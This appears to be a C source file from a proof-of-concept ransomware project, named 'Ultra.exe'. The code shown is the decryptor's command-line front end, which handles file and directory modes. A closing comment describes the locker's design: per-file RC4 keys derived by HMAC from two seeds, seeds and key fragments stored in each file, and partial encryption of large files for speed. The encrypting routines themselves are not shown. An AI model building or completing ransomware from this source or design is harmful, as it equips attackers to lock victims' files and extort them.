#include <Windows.h>
#include <stdio.h>

#include "Common.h"



int PrintHelp(CHAR* Argv0) {

	wprintf(L"[-] Usage: %s -f|-d  <input filename | directory> \n", Argv0);
	wprintf(L"[i] Example: \n");
	wprintf(L"\t[i] Ultra.exe -f FileNameToDecrypt \n");
	wprintf(L"\t[i] Ultra.exe -d DirToDecrypt \n");

	return -1;
}



int wmain(int argc, wchar_t* argv[]) {


	if (argc < 3) {
		return PrintHelp(argv[0]);
	}


	if (lstrcmpW(argv[1], L"-d") != 0 && lstrcmpW(argv[1], L"-f") != 0) {
		wprintf(L"[!] %s is an invalid argument ! \n", argv[1]);
		return PrintHelp(argv[0]);
	}


	if (lstrcmpW(argv[1], L"-d") == 0) {
		wprintf(L"[i] Decrypting \"%s\" As Dir ... \n", argv[2]);
		if (FetchFilesFromDirs(argv[2])) {
			wprintf(L"[+] Dir \"%s\" Is Decrypted Successfully \n", argv[2]);
			return 0;
		}
	}

	if (lstrcmpW(argv[1], L"-f") == 0) {
		wprintf(L"[i] Decrypting \"%s\" As File ... \n", argv[2]);
		if (InstallDecryption(argv[2])) {
			wprintf(L"[+] File \"%s\" Is Decrypted Successfully \n", argv[2]);
			return 0;
		}
	}


	printf("[!] Failed To Decrypt The Giving Arguments \n");
	return -1;
}








/*

	poc ransomeware that depends on a hmac algorithm to generate the encryption key.

	Details:
		- it uses rc4 encryption algo to do the files encryption (with 20 bytes key).
		- each file will have a different 20 byte encryption key generated for it .
		- the hmac takes 2 seeds, that will generate the key used for the decryption.
		- changing these 2 seeds, will change the key, and that's what is happening here.
		- for the decryption part, the locker will save the seeds used in the file, and will
		  save the first 4 bytes of the key used, so that we don't break the file if the key was mistakenly generated different.
		- in case of large files, the locker read and write 65535 byte only and thats to save time.



*/
